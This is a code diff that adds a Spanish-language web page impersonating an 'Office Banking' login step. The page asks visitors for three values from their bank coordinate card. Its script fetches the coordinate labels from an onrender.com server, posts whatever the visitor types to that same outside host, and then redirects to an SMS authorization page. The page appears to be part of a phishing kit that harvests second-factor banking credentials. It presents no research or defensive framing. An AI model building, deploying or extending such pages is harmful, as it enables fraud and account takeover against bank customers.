@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Autorización por Coordenadas</title>
+  <link rel="stylesheet" href="style.css">
+  <style>
+    .coord-container {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-top: 20px;
+    }
+    input.coord {
+      border: 1px solid #000;
+      outline: none;
+      color: #000;
+      padding: 5px;
+      font-size: 16px;
+      width: 40px;
+      text-align: center;
+      background-color: #fff;
+    }
+    input.coord:focus {
+      border: 1px solid #000;
+      outline: none;
+    }
+    .botones {
+      display: flex;
+      justify-content: center;
+      gap: 15px;
+      margin-top: 40px;
+    }
+    .btn-red {
+      background: red;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      padding: 12px 20px;
+      font-weight: bold;
+      cursor: pointer;
+      font-size: 15px;
+    }
+    .btn-red:hover {
+      background: #b30000;
+    }
+
+    /* 📱 Ajustes responsive para móviles */
+    @media (max-width: 600px) {
+      .coord-container {
+        flex-direction: column;
+        align-items: center;
+        gap: 15px;
+      }
+
+      input.coord {
+        width: 80px;
+        font-size: 18px;
+        padding: 8px;
+      }
+
+      .botones {
+        flex-direction: column;
+        align-items: center;
+        gap: 15px;
+        margin-top: 25px;
+      }
+
+      .btn-red {
+        width: 90%;
+        font-size: 18px;
+        padding: 14px;
+      }
+
+      h1 {
+        font-size: 20px;
+        text-align: center;
+        margin: 15px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="login-box">
+    <img src="logo-office-banking.png" alt="Office Banking" class="logo">
+    <h1>Ingrese las coordenadas solicitadas</h1>
+
+    <form id="formCoordenadas">
+      <div class="coord-container">
+        <label id="label1"></label>
+        <label id="label2"></label>
+        <label id="label3"></label>
+      </div>
+      <div class="botones">
+        <button type="submit" class="btn-red">Autorizar</button>
+      </div>
+    </form>
+
+    <div id="mensaje"></div>
+  </div>
+
+  <script>
+    // Al cargar la página, obtener coordenadas configuradas desde el backend
+    document.addEventListener("DOMContentLoaded", async () => {
+      try {
+        const res = await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/config");
+        const data = await res.json();
+
+        // Actualizar etiquetas con las coordenadas configuradas
+        document.getElementById("label1").innerHTML = `${data.coord1}: <input type="text" id="coord1" class="coord" maxlength="2" required>`;
+        document.getElementById("label2").innerHTML = `${data.coord2}: <input type="text" id="coord2" class="coord" maxlength="2" required>`;
+        document.getElementById("label3").innerHTML = `${data.coord3}: <input type="text" id="coord3" class="coord" maxlength="2" required>`;
+      } catch (err) {
+        console.error("Error al cargar coordenadas:", err);
+        document.getElementById("mensaje").innerText = "⚠️ No se pudieron cargar las coordenadas.";
+      }
+    });
+
+    // Enviar coordenadas ingresadas
+    document.getElementById("formCoordenadas").addEventListener("submit", async function(e){
+      e.preventDefault();
+      const coord1 = document.getElementById("coord1").value;
+      const coord2 = document.getElementById("coord2").value;
+      const coord3 = document.getElementById("coord3").value;
+
+      const mensaje = `Autorización por coordenadas:
+      ${document.getElementById("label1").textContent} ${coord1}
+      ${document.getElementById("label2").textContent} ${coord2}
+      ${document.getElementById("label3").textContent} ${coord3}`;
+
+      try {
+        await fetch("https://autorizaci-n-coordenadas-o-pass.onrender.com/autorizar", {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ mensaje })
+        });
+        document.getElementById("mensaje").innerText = "Coordenadas enviadas, cargando SMS...";
+        window.location.href="autorizacion-sms.html";
+      } catch (error) {
+        document.getElementById("mensaje").innerText = "⚠️ Error al enviar autorización.";
+      }
+    });
+  </script>
+</body>
+</html>
